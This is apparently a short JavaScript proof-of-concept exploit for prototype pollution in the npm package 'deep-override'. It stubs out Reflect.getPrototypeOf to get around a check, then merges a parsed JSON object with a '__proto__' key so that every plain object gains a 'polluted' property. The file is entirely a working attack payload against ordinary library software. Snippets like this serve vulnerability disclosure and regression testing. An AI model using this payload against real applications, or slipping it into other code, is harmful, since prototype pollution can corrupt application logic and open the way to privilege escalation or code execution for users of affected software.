Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride({}, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);